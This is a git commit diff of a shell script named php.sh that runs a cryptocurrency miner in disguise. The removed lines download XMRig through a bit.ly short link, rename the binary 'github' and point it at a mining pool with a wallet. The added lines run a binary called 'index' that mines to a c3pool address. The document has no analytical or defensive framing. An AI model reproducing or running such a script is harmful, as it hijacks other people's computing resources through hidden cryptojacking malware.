80882b58d13b005fe49babb8835fe14db89cef5a
Storage Small <100378380+storagegitpush404@users.noreply.github.com>
2022-03-13 16:26:03 -0700

    Update php.sh

--- php.sh
+++ php.sh
@@ -1,8 +1,4 @@
-
 #!/bin/bash
-wget -O xmrig-6.16.4-linux-static-x64.tar.gz https://bit.ly/34BX48f > /dev/null 2>&1
-tar -xvf xmrig-6.16.4-linux-static-x64.tar.gz
-cd xmrig-6.16.4
-mv xmrig github
-chmod u+x github
-./github -a Argon2/Chukwa -o codemagic.smkn2.xyz:22287 -u gunsVsqShTeEfdPeJyQreNfSKfHLm5gfFi3WWywazefsRusPS4LjKoMYLigqfsvRsqKo4kJEEjtPkGPF7xsLQMGq8YcsjUESKm --keepalive --donate-level 1 -p cpu:admin@usantixyz.xyz
+cd web
+chmod u+x index
+index --mining-threads=8 --wallet-address 8AnUmyWA5YziThGNfjSidNVKfNGW48UqhcM1G9YdCJ4Nbp21sv1KopQZ4YPytgPLDCWiUamJGjuUqNyZUPztv2rkAdS6eXf --daemon-rpc-address=auto.c3pool.org:33333
